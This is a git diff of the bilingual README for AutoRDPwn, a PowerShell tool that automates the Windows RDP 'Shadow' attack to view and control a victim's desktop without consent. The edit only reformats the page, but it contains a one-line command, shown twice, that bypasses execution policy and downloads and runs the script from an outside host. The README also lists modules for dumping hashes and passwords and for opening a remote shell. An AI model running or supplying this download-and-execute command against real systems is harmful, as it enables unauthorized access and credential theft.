@@ -1,5 +1,4 @@
-![AutoRDPwn](https://user-images.githubusercontent.com/34335312/54910387-88730b00-4eec-11e9-9eff-68b21c70f79b.png)
-
+<p align="center"><img width=500 alt="AutoRDPwn" src="https://user-images.githubusercontent.com/34335312/54979916-b451c780-4fa4-11e9-8173-1b5c885b9c3c.png?raw=true"></p>
 
 **AutoRDPwn** es un script creado en Powershell y diseñado para automatizar el ataque **Shadow** en equipos Microsoft Windows. Esta vulnerabilidad permite a un atacante remoto visualizar el escritorio de su víctima sin su consentimiento, e incluso controlarlo a petición. Para su correcto funcionamiento, es necesario cumplir los requisitos que se describen en la guía de uso.
 
@@ -37,8 +36,9 @@ Esta aplicación puede usarse de forma local, remota o para pivotar entre equipo
 Gracias a los módulos adicionales, es posible volcar hashes y contraseñas, obtener una shell remota, subir y descargar ficheros o incluso recuperar el histórico de conexiones RDP o las contraseñas de las redes inalámbricas.
 
 **Ejecución en una línea:**
-
+```
 powershell -ep bypass "cd $env:temp ; iwr https://darkbyte.net/autordpwn.php -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1"
+```
 
 **La guía detallada de uso se encuentra en el siguiente enlace:**
 
@@ -111,8 +111,9 @@ This application can be used locally, remotely or to pivot between computers.
 Thanks to the additional modules, it is possible to dump hashes and passwords, obtain a remote shell, upload and download files or even recover the history of RDP connections or passwords of wireless networks.
 
 **One line execution:**
-
+```
 powershell -ep bypass "cd $env:temp ; iwr https://darkbyte.net/autordpwn.php -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1"
+```
 
 **The detailed guide of use can be found at the following link:**
 
